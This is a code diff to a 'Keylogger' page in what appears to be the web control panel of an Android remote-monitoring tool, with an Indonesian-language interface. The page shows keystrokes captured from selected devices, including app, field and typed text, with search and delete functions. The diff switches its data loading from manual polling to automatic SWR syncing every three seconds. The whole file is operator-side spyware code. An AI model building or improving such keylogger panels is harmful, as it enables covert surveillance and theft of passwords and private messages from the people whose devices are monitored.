@@ -1,8 +1,9 @@
 'use client'
-import { useEffect, useState, useCallback } from 'react'
+import { useState, useCallback } from 'react'
 import Sidebar from '@/components/Sidebar'
 import { useDevice } from '@/contexts/DeviceContext'
 import { KeySquare, RefreshCw, Trash2, Search } from 'lucide-react'
+import useSWR from 'swr'
 
 interface Entry {
   id: number
@@ -37,36 +38,31 @@ function timeAgo(iso: string) {
   return `${Math.floor(h / 24)}h lalu`
 }
 
+const fetcher = (url: string) => fetch(url).then(r => r.json())
+
 export default function KeylogPage() {
   const { devices, selectedId, setSelectedId, connected } = useDevice()
-  const [entries, setEntries] = useState<Entry[]>([])
-  const [loading, setLoading] = useState(true)
-  const [search, setSearch]   = useState('')
+  const [search, setSearch] = useState('')
 
-  const fetchEntries = useCallback(async () => {
-    if (!selectedId) return
-    setLoading(true)
-    try {
-      const res  = await fetch(`/api/device/keylog?deviceId=${selectedId}&limit=500`)
-      const data = await res.json()
-      setEntries(data.entries ?? [])
-    } finally { setLoading(false) }
-  }, [selectedId])
+  const { data, isLoading, mutate } = useSWR(
+    selectedId ? `/api/device/keylog?deviceId=${selectedId}&limit=500` : null,
+    fetcher,
+    {
+      refreshInterval: 3000,
+      keepPreviousData: true,
+      revalidateOnFocus: true,
+    }
+  )
 
-  const clearAll = async () => {
+  const entries: Entry[] = data?.entries ?? []
+
+  const clearAll = useCallback(async () => {
     if (!selectedId || !confirm('Hapus semua data keylogger?')) return
     await fetch(`/api/device/keylog?deviceId=${selectedId}`, { method: 'DELETE' })
-    setEntries([])
-  }
+    mutate({ entries: [] }, { revalidate: false })
+  }, [selectedId, mutate])
 
-  useEffect(() => { fetchEntries() }, [fetchEntries])
-
-  useEffect(() => {
-    const t = setInterval(() => { if (selectedId) fetchEntries() }, 2000)
-    return () => clearInterval(t)
-  }, [selectedId, fetchEntries])
-
-  const filtered  = entries.filter(e =>
+  const filtered = entries.filter(e =>
     e.appName.toLowerCase().includes(search.toLowerCase()) ||
     e.fieldName.toLowerCase().includes(search.toLowerCase()) ||
     e.text.toLowerCase().includes(search.toLowerCase())
@@ -85,11 +81,11 @@ export default function KeylogPage() {
               <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
                 <KeySquare size={20} className="text-android-red" /> Keylogger
               </h2>
-              <p className="text-android-muted text-xs mt-0.5">{filtered.length} entri tersimpan · auto-refresh 2s</p>
+              <p className="text-android-muted text-xs mt-0.5">{filtered.length} entri tersimpan · auto-sync 3s</p>
             </div>
             <div className="flex gap-2">
-              <button onClick={fetchEntries} className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors">
-                <RefreshCw size={14} />
+              <button onClick={() => mutate()} className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors">
+                <RefreshCw size={14} className={isLoading ? 'animate-spin' : ''} />
               </button>
               <button onClick={clearAll} className="p-2 bg-android-surface border border-android-red/30 rounded-lg text-android-red hover:bg-android-red/10 transition-colors">
                 <Trash2 size={14} />
@@ -121,7 +117,7 @@ export default function KeylogPage() {
             </div>
           )}
 
-          {loading ? (
+          {isLoading && entries.length === 0 ? (
             <div className="text-center py-16 text-android-muted text-sm">Memuat…</div>
           ) : filtered.length === 0 ? (
             <div className="text-center py-16">
